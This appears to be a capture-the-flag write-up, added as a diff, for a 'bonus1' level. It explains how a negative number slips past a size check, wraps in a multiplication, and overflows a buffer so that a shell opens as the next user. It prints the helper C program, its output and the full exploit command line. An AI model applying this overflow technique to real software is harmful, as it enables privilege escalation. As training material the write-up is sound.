@@ -1,0 +1,53 @@
+This program takes 2 inputs on the command line. A number and a string. It converts the first input into an int and if the int is less than 10 it copies 4x that many bytes into the buffer.
+
+It then compares the number with 0x574f4c46 and runs a shell if it matches.
+
+The program multiplies the number by 4 to calculate the memcpy size. We need to overflow the int so that it is less than 4 when fed to atoi and greater or equal than 44 when overflowed.
+
+We made a program to find the number:
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+void print_number(int i, size_t n)
+{
+    printf("int: %d, size_t: %zu\n", i, n);
+}
+
+int main(int argc, char **argv)
+{
+    int size;
+
+    for (size = -2147483648; size < 10; size++)
+    {
+        print_number(size, size * 4);
+    }
+    return 0;
+}
+
+
+This produces the following result:
+
+
+int: -2147483648, size_t: 0
+int: -2147483647, size_t: 4
+int: -2147483646, size_t: 8
+int: -2147483645, size_t: 12
+int: -2147483644, size_t: 16
+int: -2147483643, size_t: 20
+int: -2147483642, size_t: 24
+int: -2147483641, size_t: 28
+int: -2147483640, size_t: 32
+int: -2147483639, size_t: 36
+int: -2147483638, size_t: 40
+int: -2147483637, size_t: 44
+
+
+The number -2147483637 is less than 10 and equal to 44. We can now create a command line to overflow the buffer and the int after the buffer.
+
+./bonus1 "-2147483637" `python -c "print 'A'*40+'\x46\x4c\x4f\x57'"`
+
+The first 40 'A' characters fill the buffer and the '\x46\x4c\x4f\x57' overwrites the int with the new number.
+
+This results in the program opening a shell as the bonus2 user.
